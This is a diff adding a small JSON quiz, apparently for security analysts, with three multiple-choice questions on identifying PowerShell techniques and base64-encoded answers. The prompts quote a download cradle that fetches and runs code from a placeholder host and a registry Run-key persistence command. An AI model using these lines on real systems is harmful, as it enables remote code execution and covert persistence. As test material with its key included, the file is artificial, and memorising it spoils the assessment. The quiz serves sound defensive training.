@@ -1,0 +1,37 @@
+{
+  "questions": [
+    {
+      "id": 1,
+      "type": "choice",
+      "prompt": "The single-line payload `iex ([System.Net.WebClient]::new().DownloadString('hxxp://x'))` combines which two subsystems to perform what action?",
+      "options": {
+        "a": "A .NET network fetch + iex eval = a download cradle (fetch-and-run in memory)",
+        "b": "COM automation + registry autostart persistence",
+        "c": "WMI process execution + WinRM remoting"
+      },
+      "answer_b64": "YQ=="
+    },
+    {
+      "id": 2,
+      "type": "choice",
+      "prompt": "You observe `Get-WmiObject Win32_Service` in a script one-liner. What two key facts does this reveal?",
+      "options": {
+        "a": "It performs WMI queries AND targets legacy PS5.1 (Get-WmiObject was removed in PS7)",
+        "b": "It accesses COM automation AND requires Linux pwsh 7",
+        "c": "It modifies registry keys AND requires WinRM remoting"
+      },
+      "answer_b64": "YQ=="
+    },
+    {
+      "id": 3,
+      "type": "choice",
+      "prompt": "Which subsystem and threat technique are represented by `Set-ItemProperty 'HKCU:\\...\\CurrentVersion\\Run' -Name Updater -Value ...`?",
+      "options": {
+        "a": "Registry — autostart persistence (T1547.001)",
+        "b": "WinRM — lateral movement (T1021.006)",
+        "c": "ACL — DACL permission escalation"
+      },
+      "answer_b64": "YQ=="
+    }
+  ]
+}
